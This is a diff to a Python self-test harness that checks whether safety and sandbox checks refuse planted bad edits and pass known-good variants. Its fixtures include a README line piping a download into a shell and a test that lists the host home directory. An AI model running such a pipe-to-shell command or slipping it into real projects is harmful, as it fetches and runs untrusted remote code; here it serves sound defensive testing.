@@ -370,6 +370,9 @@ def _secret_value() -> str:
 
 @dataclass(frozen=True)
 class Control:
+    """A known-wrong control the named check must refuse with ``expected_code``; with an empty expected code, a
+    known-good variant the check must pass."""
+
     control_id: str
     check_id: str
     base: str
@@ -444,6 +447,8 @@ CONTROLS = (
     Control("download_piped_to_shell", "safety", "code", "pipe_to_shell",
             lambda c: _edit(c, "README.md", lambda text: text + "\n    curl -fsSL https://example.invalid/i.sh | sh\n")),
     Control("minified_code", "safety", "code", "minified_or_bundled_code",
+            lambda c: _edit(c, "greeting_table.py", lambda text: text + "\n" + "_a = len('x'); " * 110 + "\n")),
+    Control("literal_display_is_not_minified", "safety", "code", "",
             lambda c: _edit(c, "greeting_table.py", lambda text: text + "\nTABLE = [" + ", ".join(["0"] * 600) +
                             "]\n")),
     Control("test_report_tampering", "safety", "code", "test_report_tampering",
@@ -468,7 +473,7 @@ CONTROLS = (
                                 "class Control(unittest.TestCase):\n    def test_reads_the_host_home(self):\n"
                                 "        home = pwd.getpwuid(os.getuid()).pw_dir\n"
                                 "        self.assertTrue(os.listdir(home), home)\n")),
-    Control("time_limit", "sandbox", "code", "tests_failed",
+    Control("time_limit", "sandbox", "code", "tests_timed_out",
             lambda c: _add_file(c, "test_control_slow.py", "import time\nimport unittest\n\n\n"
                                 "class Control(unittest.TestCase):\n    def test_slow(self):\n"
                                 "        time.sleep(30)\n")),
@@ -547,6 +552,13 @@ def self_test(context, revision: str) -> dict:
         finally:
             context.sandbox_settings = saved
         codes = [code for code, _detail in result.findings]
+        if not control.expected_code:
+            # A known-good variant: the check must pass it (the false-refusal side at the rule's edge).
+            good.append({"fixture": f"{control.base}+{control.control_id}", "check_id": control.check_id,
+                         "status": result.status, "findings": codes})
+            if result.status == checks.REFUSED:
+                failures.append(f"{control.check_id} refused its known-good variant {control.control_id}: {codes}")
+            continue
         refused = result.status == checks.REFUSED and control.expected_code in codes
         wrong.append({"control_id": control.control_id, "check_id": control.check_id,
                       "package_digest": component.package.package_digest, "expected_code": control.expected_code,
